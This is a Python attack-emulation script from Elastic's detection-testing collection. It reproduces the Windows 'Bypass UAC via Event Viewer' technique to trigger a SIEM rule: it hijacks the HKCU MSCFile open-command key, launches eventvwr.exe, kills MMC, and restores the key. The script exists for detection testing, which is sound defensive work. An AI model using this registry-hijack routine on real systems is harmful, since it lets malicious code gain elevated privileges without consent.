# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Bypass UAC via Event Viewer
# RTA: uac_eventviewer.py
# ATT&CK: T1088
# Description: Modifies the Registry value to change the handler for MSC files, bypassing UAC.

import logging
import time

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="1185afa2-49aa-4cca-8702-228d238c0bd5",
    name="uac_eventviewer",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[RuleMetadata(id="31b4c719-f2b4-41f6-a9bd-fce93c2eaf62", name="Bypass UAC via Event Viewer")],
    techniques=["T1548"],
)


# Default machine value:
# HKLM\Software\Classes\MSCFile\shell\open\command\(Default)
# %SystemRoot%\system32\mmc.exe "%1" %*


def main(target_file=_common.get_resource_path("bin/myapp.exe")):
    winreg = _common.get_winreg()
    log.info("Bypass UAC with %s" % target_file)

    log.info("Writing registry key")
    hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
    winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)

    log.info("Running event viewer")
    _ = _common.execute_command(["c:\\windows\\system32\\eventvwr.exe"])

    time.sleep(3)
    log.info("Killing MMC")
    _ = _common.execute_command(["taskkill", "/f", "/im", "mmc.exe"])

    log.info("Restoring registry key", log_type="-")
    winreg.DeleteValue(hkey, "")
    winreg.DeleteKey(hkey, "")
    winreg.CloseKey(hkey)
